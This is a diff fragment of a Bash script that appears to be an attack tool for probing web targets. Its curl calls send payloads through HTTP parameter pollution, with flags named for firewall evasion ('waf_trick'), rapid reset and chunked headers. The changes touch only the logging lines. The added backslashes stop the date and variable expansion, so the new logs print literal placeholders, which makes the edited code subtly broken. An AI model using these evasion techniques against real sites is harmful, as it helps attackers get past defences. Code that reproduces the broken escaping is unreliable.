@@ -194,7 +194,7 @@ local active_payload=""
           fi
           if [ "$REQ_METHOD" = "POST" ]; then
           
-          echo -e "[\033[34m$(date "+%H:%M:%S")\033[0m] [\e[0;34m<\e[0;34m] Vector 1 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[90m(Payload: ${active_payload})\033[0m\n"
+          echo -e "[\033[34m\$(date +%H:%M:%S)\033[0m] [\e[0;34m<\e[0;34m] Vector 1 [POST][PORT:\$random_port] Param: \$TARGET_PARAM \033[90m\(Payload: \${active_payload}\)\033[0m\n"
 
           curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
             curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
@@ -204,7 +204,7 @@ local active_payload=""
             "${target_url}${default_path}")
         else
 
-          echo -e "[\033[34m$(date "+%H:%M:%S")\033[0m] [\e[0;34m<\e[0;34m] Vector 1 [GET][Port:$random_port] Probing: \033[90m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
+          echo -e "[\033[34m\$(date +%H:%M:%S)\033[0m] [\e[0;34m<\e[0;34m] Vector 1 [GET][Port:\$random_port] Probing: \033[90m\${clean_target_url}\${default_path}?\${TARGET_PARAM}=\${active_payload}\033[0m\n"
           
           curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -300,7 +300,8 @@ fi
 
           if [ "$REQ_METHOD" = "POST" ]; then
             
-            echo -e "[\033[34m$(date "+%H:%M:%S")\033[0m] [\e[0;34m<\e[0;34m] Vector 2 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[90m(Payload: ${active_payload})\033[0m\n"
+            echo -e "[\033[34m\$(date +%H:%M:%S)\033[0m] [\e[0;34m<\e[0;34m] Vector 2 [POST][PORT:\$random_port] Param: \$TARGET_PARAM \033[90m\(Payload: \${active_payload}\)\033[0m\n"
+
             curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
               curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -309,7 +310,7 @@ fi
               "${target_url}${default_path}")
           else
 
-            echo -e "[\033[34m$(date "+%H:%M:%S")\033[0m] [\e[0;34m<\e[0;34m] Vector 2 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[90m(Payload: ${active_payload})\033[0m\n"
+            echo -e "[\033[34m\$(date +%H:%M:%S)\033[0m] [\e[0;34m<\e[0;34m] Vector 2 [GET][Port:\$random_port] Probing: \033[90m\${clean_target_url}\${default_path}?\${TARGET_PARAM}=\${active_payload}\033[0m\n"
 
             curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
